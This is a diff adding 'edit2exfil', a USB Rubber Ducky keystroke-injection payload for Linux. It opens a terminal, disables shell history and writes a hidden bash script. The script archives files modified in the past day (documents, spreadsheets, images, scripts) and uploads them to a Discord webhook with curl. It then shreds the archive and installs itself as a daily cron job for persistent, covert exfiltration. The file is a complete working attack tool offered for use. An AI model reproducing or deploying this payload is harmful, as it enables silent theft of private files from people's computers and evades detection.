@@ -1,0 +1,53 @@
+REM ==========================================================================================
+REM TITLE: edit2exfil
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Linux (tested on Kali Linux Release 2025-W19)
+REM DESCRIPTION: (See README.md for full description) - edit2exfil builds a hidden bash script (.e2e.sh) in the /home directory that searches for files (see README.md) that have been modified in the last 24 hours in the /home directory (recursively). If found, the files are tarballed and exfiltrated via Discord webhook. The tarball is then shredded locally to obfuscate. The script is embedded as a cronjob, running silently in the background, every 24 hours at 10:00 AM (this can be adjusted in line 53); allowing for persistent exfiltration of files as they are updated.
+REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10.
+REM ==========================================================================================
+
+REM Place Discord webhook constant:
+DEFINE #WEBHOOK_URL https://discord.com/api/webhooks/PLACE/WEBHOOK/HERE
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening terminal:
+CTRL ALT t
+DELAY 300
+
+REM Unsetting terminal history and building ".e2e.sh":
+STRINGLN unset HISTFILE
+STRINGLN cat > .e2e.sh
+STRINGLN_BASH
+file_check() {
+    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | grep -q . 
+}
+tarball() {
+    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -czf ~/.loot.tar.gz --null -T -
+}
+net_check() {
+    ping -c 1 hak5.org
+}
+user="$(whoami)"
+
+if net_check; then
+    if file_check; then
+        tarball
+    else
+        exit 0
+    fi
+else
+    exit 0
+fi
+curl -X POST -H "Content-Type: multipart/form-data" \
+-F "file=@/home/$user/.loot.tar.gz" \
+-F "content=$ Loot Incoming $" \
+#WEBHOOK_URL
+shred -fuz ~/.loot.tar.gz
+END_STRINGLN
+CTRL c
+
+REM Granting execution permissions and adding ".e2e.sh" to cronjob to be executed at 10:00 AM, daily:
+STRINGLN chmod +x .e2e.sh; crontab -l > e2etemp; echo "0 10 * * * ~/.e2e.sh" >> e2etemp; crontab e2etemp; shred -fuz e2etemp; exit
